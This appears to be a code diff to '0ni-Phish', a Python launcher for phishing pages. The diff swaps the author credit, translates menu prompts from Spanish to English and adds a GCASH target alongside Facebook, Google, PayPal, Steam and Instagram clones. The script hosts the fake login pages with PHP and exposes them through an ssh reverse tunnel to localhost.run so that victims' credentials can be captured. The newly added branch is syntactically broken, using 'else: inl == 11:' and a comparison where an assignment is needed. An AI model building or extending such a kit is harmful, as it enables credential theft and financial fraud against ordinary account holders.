@@ -1,7 +1,5 @@
-# 0ni-Phish
-# By: Euronymou5
-# https://twitter.com/Euronymou51
-# https://github.com/Euronymou5
+# 0ni-Phish_Azvi
+# By: AZVI GEIOR
 
 import os
 import time
@@ -48,8 +46,8 @@ def setup(site):
     print('[~] Puerto: 8080')
     os.system(f"php -S localhost:8080 -t pages/{site} > /dev/null 2>&1 & ")
     time.sleep(2)
-    print('\n[~] Servidor php: ✔️')
-    print('\n[~] Creando links...')
+    print('\n[~] Service php: ✔️')
+    print('\n[~] Createdlinks...')
     time.sleep(2)
     bgtask("ssh -R 80:localhost:8080 localhost.run -T -n", stdout=cf_log, stderr=cf_log)
     cf_success = False
@@ -88,7 +86,7 @@ def menu():
 ████  ██ ██  ██ ██ ██     ██      ██   ██ ██      ██ ██   ██ 
  ██████  ██   ████ ██     ██      ██   ██ ██ ███████ ██   ██
                   v3.0
-           |---[  By: Euronymou5 ]---|       
+           |---[  By: AZVI GEIOR ]---|       
     """)
     print("""
     [1] Facebook   [2] Google gmail
@@ -100,10 +98,12 @@ def menu():
     [7] Paypal     [8] Roblox
 
     [9] Steam      [10] Instagram
+
+    [11] GCASH
     """)
     inl = int(input('\n>> '))
     if inl == 1:
-        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[~] Select user language :')
         print('\n[1] Español')
         print('\n[2] Ingles')
         a = int(input('\n>> '))
@@ -119,7 +119,7 @@ def menu():
         site = "Google"
         setup(site)
     elif inl == 3:
-        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[~] Select user language :')
         print('\n[1] Español')
         print('\n[2] Ingles')
         a = int(input('\n>> '))
@@ -138,7 +138,7 @@ def menu():
         site = "Github"
         setup(site) 
     elif inl == 6:
-        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[~] Select user language:')
         print('\n[1] Español')
         print('\n[2] Ingles')
         a = int(input('\n>> '))
@@ -154,7 +154,7 @@ def menu():
         site = "paypal"
         setup(site)
     elif inl == 8:
-        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[~] Select user language:')
         print('\n[1] Español')
         print('\n[2] Ingles')
         a = int(input('\n>> '))
@@ -167,7 +167,7 @@ def menu():
         else:
             menu()
     elif inl == 9:
-        print('\n[~] Selecciona el lenguaje que deseas usar:')
+        print('\n[~] Select user language:')
         print('\n[1] Español')
         print('\n[2] Ingles')
         a = int(input('\n>> '))
@@ -183,10 +183,14 @@ def menu():
         site = "instagram"
         setup(site)
     else:
-        print(f'{Fore.RED}\n[!] Error opcion invalida!')
+        print(f'{Fore.RED}\n[!] Error  Option Invalid!')
         time.sleep(2)
         menu()
-
+   else: inl == 11:
+        site == "Gcash login"
+        setup(site) 
+   else: 
+        print(f'{Fore.RED}\n[!] Error Option Invalid!')
 
 def config():
     home = os.getenv("HOME")
